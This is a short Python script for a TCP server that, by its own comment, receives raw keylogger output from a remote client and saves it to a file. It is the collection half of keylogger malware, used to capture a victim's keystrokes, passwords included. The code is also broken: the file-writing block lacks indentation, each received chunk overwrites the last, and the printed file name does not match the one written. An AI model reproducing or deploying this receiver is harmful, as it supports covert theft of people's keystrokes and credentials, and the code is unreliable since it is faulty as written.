# TCP Server program to receive raw keylogger output from remote client.

import socket

HOST = '' # Symbolic name meaning all available interfaces
PORT = 50007 # Arbitrary non-privileged port

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((HOST, PORT))
s.listen(1) # Specifies 1 maximum queued connection (max may be 5, see docs)

conn, addr = s.accept()
print('Connected to {}'.format(addr))

while True:
	data = conn.recv(1024)
	if not data: break
	
	with open("keylog_formatted.txt", "w") as log_raw:
	log_raw.write(data)
	log_raw.close()
	print('[*] Formatted output saved in keylog_raw.txt' + '\n')
